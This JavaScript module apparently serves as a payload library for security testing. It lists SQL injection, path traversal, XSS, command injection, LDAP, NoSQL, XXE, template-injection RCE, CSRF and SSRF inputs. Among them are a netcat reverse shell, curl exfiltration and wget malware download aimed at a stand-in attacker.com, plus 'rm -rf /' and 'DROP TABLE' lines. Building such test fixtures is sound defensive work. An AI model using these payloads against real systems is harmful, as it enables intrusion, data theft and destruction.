/**
 * Attack Payloads for Security Testing
 * Contains various attack payloads for testing security controls
 */

class AttackPayloads {
  constructor() {
    this.payloads = {
      sqlInjection: this.generateSQLInjectionPayloads(),
      pathTraversal: this.generatePathTraversalPayloads(),
      xss: this.generateXSSPayloads(),
      commandInjection: this.generateCommandInjectionPayloads(),
      ldapInjection: this.generateLDAPInjectionPayloads(),
      nosqlInjection: this.generateNoSQLInjectionPayloads(),
      xxe: this.generateXXEPayloads(),
      templateInjection: this.generateTemplateInjectionPayloads(),
      csrf: this.generateCSRFPayloads(),
      ssrf: this.generateSSRFPayloads()
    };
  }

  /**
   * Generate SQL injection attack payloads
   * @returns {Array} SQL injection payloads
   */
  generateSQLInjectionPayloads() {
    return [
      {
        name: 'Basic OR injection',
        payload: "' OR '1'='1",
        description: 'Basic boolean-based SQL injection',
        severity: 'high'
      },
      {
        name: 'Union-based injection',
        payload: "' UNION SELECT * FROM users; --",
        description: 'Union-based SQL injection to extract data',
        severity: 'critical'
      },
      {
        name: 'Table drop injection',
        payload: "'; DROP TABLE users; --",
        description: 'Destructive SQL injection to drop tables',
        severity: 'critical'
      },
      {
        name: 'Blind boolean injection',
        payload: "' AND (SELECT COUNT(*) FROM users) > 0 --",
        description: 'Blind boolean-based SQL injection',
        severity: 'high'
      },
      {
        name: 'Time-based blind injection',
        payload: "'; WAITFOR DELAY '00:00:05'; --",
        description: 'Time-based blind SQL injection',
        severity: 'high'
      },
      {
        name: 'Error-based injection',
        payload: "' AND (SELECT * FROM users) --",
        description: 'Error-based SQL injection',
        severity: 'medium'
      },
      {
        name: 'Stacked queries',
        payload: "'; INSERT INTO users (username) VALUES ('hacker'); --",
        description: 'Stacked queries SQL injection',
        severity: 'critical'
      },
      {
        name: 'Second-order injection',
        payload: "admin'/*",
        description: 'Second-order SQL injection',
        severity: 'high'
      },
      {
        name: 'Numeric injection',
        payload: "1 OR 1=1",
        description: 'Numeric SQL injection',
        severity: 'high'
      },
      {
        name: 'Subquery injection',
        payload: "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) AS t) > 0 --",
        description: 'Subquery-based SQL injection',
        severity: 'medium'
      }
    ];
  }

  /**
   * Generate path traversal attack payloads
   * @returns {Array} Path traversal payloads
   */
  generatePathTraversalPayloads() {
    return [
      {
        name: 'Basic path traversal',
        payload: '../../../etc/passwd',
        description: 'Basic Unix path traversal',
        severity: 'high'
      },
      {
        name: 'Windows path traversal',
        payload: '..\\..\\..\\windows\\system32\\config\\sam',
        description: 'Windows path traversal',
        severity: 'high'
      },
      {
        name: 'URL encoded traversal',
        payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        description: 'URL encoded path traversal',
        severity: 'high'
      },
      {
        name: 'Double encoded traversal',
        payload: '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
        description: 'Double URL encoded path traversal',
        severity: 'medium'
      },
      {
        name: 'Dot segment traversal',
        payload: '....//....//....//etc//passwd',
        description: 'Dot segment path traversal',
        severity: 'medium'
      },
      {
        name: 'Null byte traversal',
        payload: '../../../../../../../etc/passwd%00',
        description: 'Null byte path traversal',
        severity: 'high'
      },
      {
        name: 'Unicode traversal',
        payload: '\\u002e\\u002e\\u002f\\u002e\\u002e\\u002f\\u002e\\u002e\\u002fetc\\u002fpasswd',
        description: 'Unicode encoded path traversal',
        severity: 'medium'
      },
      {
        name: 'Overlong UTF-8 traversal',
        payload: '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        description: 'Overlong UTF-8 path traversal',
        severity: 'medium'
      },
      {
        name: 'UNC path traversal',
        payload: '\\\\..\\..\\..\\etc\\passwd',
        description: 'UNC path traversal',
        severity: 'medium'
      },
      {
        name: 'Absolute path access',
        payload: '/etc/passwd',
        description: 'Direct absolute path access',
        severity: 'high'
      }
    ];
  }

  /**
   * Generate XSS attack payloads
   * @returns {Array} XSS payloads
   */
  generateXSSPayloads() {
    return [
      {
        name: 'Basic script tag',
        payload: '<script>alert("XSS")</script>',
        description: 'Basic script tag XSS',
        severity: 'high'
      },
      {
        name: 'Image onerror',
        payload: '<img src="x" onerror="alert(1)">',
        description: 'Image tag with onerror event',
        severity: 'high'
      },
      {
        name: 'SVG onload',
        payload: '<svg onload="alert(1)">',
        description: 'SVG tag with onload event',
        severity: 'high'
      },
      {
        name: 'JavaScript protocol',
        payload: 'javascript:alert("XSS")',
        description: 'JavaScript protocol XSS',
        severity: 'high'
      },
      {
        name: 'Iframe XSS',
        payload: '<iframe src="javascript:alert(1)">',
        description: 'Iframe with JavaScript source',
        severity: 'high'
      },
      {
        name: 'Body onload',
        payload: '<body onload="alert(1)">',
        description: 'Body tag with onload event',
        severity: 'high'
      },
      {
        name: 'Input autofocus',
        payload: '<input type="text" onfocus="alert(1)" autofocus>',
        description: 'Input with autofocus and onfocus',
        severity: 'medium'
      },
      {
        name: 'Details ontoggle',
        payload: '<details open ontoggle="alert(1)">',
        description: 'Details tag with ontoggle event',
        severity: 'medium'
      },
      {
        name: 'Marquee onstart',
        payload: '<marquee onstart="alert(1)">',
        description: 'Marquee tag with onstart event',
        severity: 'medium'
      },
      {
        name: 'Event handler injection',
        payload: '" onmouseover="alert(1)',
        description: 'Event handler attribute injection',
        severity: 'high'
      },
      {
        name: 'CSS expression',
        payload: '<style>body{background:url("javascript:alert(1)")}</style>',
        description: 'CSS with JavaScript expression',
        severity: 'medium'
      },
      {
        name: 'Meta refresh',
        payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        description: 'Meta refresh with JavaScript',
        severity: 'medium'
      }
    ];
  }

  /**
   * Generate command injection attack payloads
   * @returns {Array} Command injection payloads
   */
  generateCommandInjectionPayloads() {
    return [
      {
        name: 'Semicolon command separator',
        payload: '; rm -rf /',
        description: 'Command injection using semicolon',
        severity: 'critical'
      },
      {
        name: 'Pipe command chaining',
        payload: '| cat /etc/passwd',
        description: 'Command injection using pipe',
        severity: 'high'
      },
      {
        name: 'AND operator',
        payload: '&& whoami',
        description: 'Command injection using AND operator',
        severity: 'high'
      },
      {
        name: 'OR operator',
        payload: '|| id',
        description: 'Command injection using OR operator',
        severity: 'high'
      },
      {
        name: 'Backtick execution',
        payload: '`whoami`',
        description: 'Command injection using backticks',
        severity: 'high'
      },
      {
        name: 'Dollar parentheses',
        payload: '$(whoami)',
        description: 'Command injection using $()',
        severity: 'high'
      },
      {
        name: 'Netcat reverse shell',
        payload: '; nc -e /bin/sh attacker.com 4444',
        description: 'Netcat reverse shell command',
        severity: 'critical'
      },
      {
        name: 'Curl data exfiltration',
        payload: '| curl http://attacker.com/steal?data=$(cat /etc/passwd)',
        description: 'Data exfiltration using curl',
        severity: 'high'
      },
      {
        name: 'Wget malware download',
        payload: '&& wget http://attacker.com/malware.sh -O /tmp/malware.sh',
        description: 'Malware download using wget',
        severity: 'critical'
      },
      {
        name: 'Python command execution',
        payload: '; python -c "import os; os.system(\'id\')"',
        description: 'Python command execution',
        severity: 'high'
      }
    ];
  }

  /**
   * Generate LDAP injection attack payloads
   * @returns {Array} LDAP injection payloads
   */
  generateLDAPInjectionPayloads() {
    return [
      {
        name: 'LDAP wildcard injection',
        payload: '*)(&(objectClass=user)',
        description: 'LDAP wildcard injection',
        severity: 'high'
      },
      {
        name: 'LDAP OR injection',
        payload: '*)|(objectClass=*)',
        description: 'LDAP OR injection',
        severity: 'high'
      },
      {
        name: 'LDAP password enumeration',
        payload: '*)(&(userPassword=*))',
        description: 'LDAP password enumeration',
        severity: 'high'
      },
      {
        name: 'LDAP attribute enumeration',
        payload: '*)(&(|(objectClass=user)(objectClass=person)))',
        description: 'LDAP attribute enumeration',
        severity: 'medium'
      },
      {
        name: 'LDAP common name injection',
        payload: '*)(&(cn=*))',
        description: 'LDAP common name injection',
        severity: 'medium'
      },
      {
        name: 'LDAP mail injection',
        payload: '*)(&(mail=*))',
        description: 'LDAP mail attribute injection',
        severity: 'medium'
      },
      {
        name: 'LDAP UID injection',
        payload: '*)(&(uid=*))',
        description: 'LDAP UID injection',
        severity: 'medium'
      },
      {
        name: 'LDAP surname injection',
        payload: '*)(&(sn=*))',
        description: 'LDAP surname injection',
        severity: 'medium'
      },
      {
        name: 'LDAP given name injection',
        payload: '*)(&(givenName=*))',
        description: 'LDAP given name injection',
        severity: 'medium'
      },
      {
        name: 'LDAP memberOf injection',
        payload: '*)(&(memberOf=*))',
        description: 'LDAP memberOf injection',
        severity: 'medium'
      }
    ];
  }

  /**
   * Generate NoSQL injection attack payloads
   * @returns {Array} NoSQL injection payloads
   */
  generateNoSQLInjectionPayloads() {
    return [
      {
        name: 'MongoDB not equal',
        payload: '{"$ne": null}',
        description: 'MongoDB not equal injection',
        severity: 'high'
      },
      {
        name: 'MongoDB greater than',
        payload: '{"$gt": ""}',
        description: 'MongoDB greater than injection',
        severity: 'high'
      },
      {
        name: 'MongoDB regex',
        payload: '{"$regex": ".*"}',
        description: 'MongoDB regex injection',
        severity: 'high'
      },
      {
        name: 'MongoDB where clause',
        payload: '{"$where": "this.username == this.password"}',
        description: 'MongoDB where clause injection',
        severity: 'critical'
      },
      {
        name: 'MongoDB OR injection',
        payload: '{"$or": [{"username": "admin"}, {"username": "root"}]}',
        description: 'MongoDB OR injection',
        severity: 'high'
      },
      {
        name: 'MongoDB in operator',
        payload: '{"username": {"$in": ["admin", "root"]}}',
        description: 'MongoDB in operator injection',
        severity: 'high'
      },
      {
        name: 'MongoDB AND injection',
        payload: '{"$and": [{"username": {"$ne": null}}, {"password": {"$ne": null}}]}',
        description: 'MongoDB AND injection',
        severity: 'medium'
      },
      {
        name: 'MongoDB NOR injection',
        payload: '{"$nor": [{"username": "guest"}]}',
        description: 'MongoDB NOR injection',
        severity: 'medium'
      },
      {
        name: 'MongoDB exists',
        payload: '{"password": {"$exists": true}}',
        description: 'MongoDB exists injection',
        severity: 'medium'
      },
      {
        name: 'MongoDB text search',
        payload: '{"$text": {"$search": "admin"}}',
        description: 'MongoDB text search injection',
        severity: 'medium'
      }
    ];
  }

  /**
   * Generate XXE attack payloads
   * @returns {Array} XXE payloads
   */
  generateXXEPayloads() {
    return [
      {
        name: 'Basic XXE',
        payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        description: 'Basic XXE file disclosure',
        severity: 'high'
      },
      {
        name: 'Blind XXE',
        payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        description: 'Blind XXE with external entity',
        severity: 'high'
      },
      {
        name: 'XXE with parameter entity',
        payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>',
        description: 'XXE using parameter entity',
        severity: 'high'
      },
      {
        name: 'XXE Windows file access',
        payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/config/sam">]><foo>&xxe;</foo>',
        description: 'XXE Windows file access',
        severity: 'high'
      },
      {
        name: 'XXE SSRF',
        payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        description: 'XXE SSRF to metadata service',
        severity: 'high'
      }
    ];
  }

  /**
   * Generate template injection attack payloads
   * @returns {Array} Template injection payloads
   */
  generateTemplateInjectionPayloads() {
    return [
      {
        name: 'Jinja2 template injection',
        payload: '{{7*7}}',
        description: 'Jinja2 template injection test',
        severity: 'high'
      },
      {
        name: 'Jinja2 file read',
        payload: '{{get_flashed_messages.__globals__[\'__builtins__\'][\'open\'](\'/etc/passwd\').read()}}',
        description: 'Jinja2 file read injection',
        severity: 'critical'
      },
      {
        name: 'Jinja2 RCE',
        payload: '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
        description: 'Jinja2 remote code execution',
        severity: 'critical'
      },
      {
        name: 'Handlebars template injection',
        payload: '{{#with "constructor" as |c|}}{{#with (c.constructor "return global.process.mainModule.require(\'child_process\').execSync(\'id\')") as |f|}}{{f}}{{/with}}{{/with}}',
        description: 'Handlebars template injection',
        severity: 'critical'
      },
      {
        name: 'Twig template injection',
        payload: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
        description: 'Twig template injection',
        severity: 'critical'
      },
      {
        name: 'Smarty template injection',
        payload: '{php}echo `id`;{/php}',
        description: 'Smarty template injection',
        severity: 'critical'
      }
    ];
  }

  /**
   * Generate CSRF attack payloads
   * @returns {Array} CSRF payloads
   */
  generateCSRFPayloads() {
    return [
      {
        name: 'Basic CSRF form',
        payload: '<form action="/admin/users" method="POST"><input name="username" value="hacker"><input name="password" value="password"><input type="submit"></form>',
        description: 'Basic CSRF form attack',
        severity: 'high'
      },
      {
        name: 'CSRF with auto-submit',
        payload: '<form id="csrf" action="/admin/users" method="POST"><input name="username" value="hacker"></form><script>document.getElementById("csrf").submit();</script>',
        description: 'CSRF with automatic form submission',
        severity: 'high'
      },
      {
        name: 'CSRF via image',
        payload: '<img src="/admin/delete?id=1" style="display:none">',
        description: 'CSRF via image GET request',
        severity: 'medium'
      },
      {
        name: 'CSRF via XHR',
        payload: '<script>var xhr = new XMLHttpRequest(); xhr.open("POST", "/admin/users"); xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); xhr.send("username=hacker&password=password");</script>',
        description: 'CSRF via XMLHttpRequest',
        severity: 'high'
      },
      {
        name: 'CSRF via fetch',
        payload: '<script>fetch("/admin/users", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({username: "hacker", password: "password"})});</script>',
        description: 'CSRF via fetch API',
        severity: 'high'
      }
    ];
  }

  /**
   * Generate SSRF attack payloads
   * @returns {Array} SSRF payloads
   */
  generateSSRFPayloads() {
    return [
      {
        name: 'AWS metadata service',
        payload: 'http://169.254.169.254/latest/meta-data/',
        description: 'SSRF to AWS metadata service',
        severity: 'high'
      },
      {
        name: 'Google Cloud metadata',
        payload: 'http://metadata.google.internal/computeMetadata/v1/',
        description: 'SSRF to Google Cloud metadata',
        severity: 'high'
      },
      {
        name: 'Azure metadata service',
        payload: 'http://169.254.169.254/metadata/instance?api-version=2017-08-01',
        description: 'SSRF to Azure metadata service',
        severity: 'high'
      },
      {
        name: 'Local file access',
        payload: 'file:///etc/passwd',
        description: 'SSRF file protocol access',
        severity: 'high'
      },
      {
        name: 'Internal network scan',
        payload: 'http://127.0.0.1:22',
        description: 'SSRF internal network scanning',
        severity: 'medium'
      },
      {
        name: 'FTP protocol',
        payload: 'ftp://127.0.0.1',
        description: 'SSRF FTP protocol access',
        severity: 'medium'
      },
      {
        name: 'Gopher protocol',
        payload: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a',
        description: 'SSRF Gopher protocol Redis attack',
        severity: 'high'
      },
      {
        name: 'LDAP protocol',
        payload: 'ldap://127.0.0.1:389',
        description: 'SSRF LDAP protocol access',
        severity: 'medium'
      },
      {
        name: 'Dict protocol',
        payload: 'dict://127.0.0.1:11211',
        description: 'SSRF Dict protocol access',
        severity: 'medium'
      },
      {
        name: 'Bypass localhost',
        payload: 'http://0.0.0.0:8080',
        description: 'SSRF localhost bypass',
        severity: 'medium'
      }
    ];
  }

  /**
   * Get payloads by type
   * @param {string} type - Attack type
   * @returns {Array} Payloads for the specified type
   */
  getPayloadsByType(type) {
    return this.payloads[type] || [];
  }

  /**
   * Get SQL injection payloads
   * @returns {Array} SQL injection payloads
   */
  getSQLInjectionPayloads() {
    return this.payloads.sqlInjection;
  }

  /**
   * Get path traversal payloads
   * @returns {Array} Path traversal payloads
   */
  getPathTraversalPayloads() {
    return this.payloads.pathTraversal;
  }

  /**
   * Get XSS payloads
   * @returns {Array} XSS payloads
   */
  getXSSPayloads() {
    return this.payloads.xss;
  }

  /**
   * Get command injection payloads
   * @returns {Array} Command injection payloads
   */
  getCommandInjectionPayloads() {
    return this.payloads.commandInjection;
  }

  /**
   * Get LDAP injection payloads
   * @returns {Array} LDAP injection payloads
   */
  getLDAPInjectionPayloads() {
    return this.payloads.ldapInjection;
  }

  /**
   * Get NoSQL injection payloads
   * @returns {Array} NoSQL injection payloads
   */
  getNoSQLInjectionPayloads() {
    return this.payloads.nosqlInjection;
  }

  /**
   * Get XXE payloads
   * @returns {Array} XXE payloads
   */
  getXXEPayloads() {
    return this.payloads.xxe;
  }

  /**
   * Get template injection payloads
   * @returns {Array} Template injection payloads
   */
  getTemplateInjectionPayloads() {
    return this.payloads.templateInjection;
  }

  /**
   * Get CSRF payloads
   * @returns {Array} CSRF payloads
   */
  getCSRFPayloads() {
    return this.payloads.csrf;
  }

  /**
   * Get SSRF payloads
   * @returns {Array} SSRF payloads
   */
  getSSRFPayloads() {
    return this.payloads.ssrf;
  }

  /**
   * Get all payloads
   * @returns {Object} All attack payloads
   */
  getAllPayloads() {
    return this.payloads;
  }

  /**
   * Get payloads by severity
   * @param {string} severity - Severity level (critical, high, medium, low)
   * @returns {Array} Payloads with the specified severity
   */
  getPayloadsBySeverity(severity) {
    const allPayloads = [];
    Object.values(this.payloads).forEach(typePayloads => {
      allPayloads.push(...typePayloads.filter(payload => payload.severity === severity));
    });
    return allPayloads;
  }

  /**
   * Get random payload by type
   * @param {string} type - Attack type
   * @returns {Object} Random payload
   */
  getRandomPayload(type) {
    const payloads = this.getPayloadsByType(type);
    if (payloads.length === 0) return null;
    return payloads[Math.floor(Math.random() * payloads.length)];
  }

  /**
   * Filter payloads by description
   * @param {string} searchTerm - Search term
   * @returns {Array} Filtered payloads
   */
  filterPayloads(searchTerm) {
    const allPayloads = [];
    Object.values(this.payloads).forEach(typePayloads => {
      allPayloads.push(...typePayloads.filter(payload => 
        payload.description.toLowerCase().includes(searchTerm.toLowerCase()) ||
        payload.name.toLowerCase().includes(searchTerm.toLowerCase())
      ));
    });
    return allPayloads;
  }

  /**
   * Get payload statistics
   * @returns {Object} Payload statistics
   */
  getStatistics() {
    const stats = {
      totalPayloads: 0,
      byType: {},
      bySeverity: {
        critical: 0,
        high: 0,
        medium: 0,
        low: 0
      }
    };

    Object.entries(this.payloads).forEach(([type, payloads]) => {
      stats.byType[type] = payloads.length;
      stats.totalPayloads += payloads.length;

      payloads.forEach(payload => {
        stats.bySeverity[payload.severity]++;
      });
    });

    return stats;
  }
}

module.exports = { AttackPayloads };